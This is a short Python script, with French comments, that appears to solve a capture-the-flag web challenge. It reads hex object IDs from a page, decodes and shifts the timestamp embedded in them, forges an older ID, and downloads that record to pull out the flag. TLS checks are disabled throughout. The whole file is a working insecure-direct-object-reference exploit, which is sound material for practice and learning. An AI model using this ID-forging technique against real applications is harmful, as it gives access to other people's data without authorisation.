#!/usr/bin/env python3
import requests
import re
from datetime import datetime, timezone
from dateutil.relativedelta import relativedelta
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True)
parser.add_argument("-m", "--months", type=int, default=12)
args = parser.parse_args()

# 1) Récupérer la page principale
response = requests.get(args.url, verify=False)
ids = re.findall(r"showDetails\('([A-F0-9]+)'\)", response.text)

# 2) Premier ID (référence M-0)
base_id = ids[0]

prefix = base_id[:16]
timestamp_hex = base_id[16:24]
suffix = base_id[24:]

# 3) HEX → timestamp → datetime UTC
ts = int(timestamp_hex, 16)
dt = datetime.fromtimestamp(ts, tz=timezone.utc)

# 4) Calculer -N mois
new_dt = dt - relativedelta(months=args.months)

# 5) Convertir en timestamp puis hex
new_ts = int(new_dt.timestamp())
new_hex = f"{new_ts:08X}"

# 6) Reconstruire l'ID
new_id = f"{prefix}{new_hex}{suffix}"

# 7) Resultats
print(f"M-{args.months} hex     : {new_hex}")
print(f"M-{args.months} full ID : {new_id}")
print(f"UTC date     : {new_dt.strftime('%Y-%m-%d %H:%M:%S')}")

# Récupération du Flag
url = f"{args.url}/details/{new_id}/download"
r = requests.get(url, verify=False)

m = re.search(r"CTF\{.*?\}", r.text)
if m:
    print(f"Flag         : {m.group(0)}")
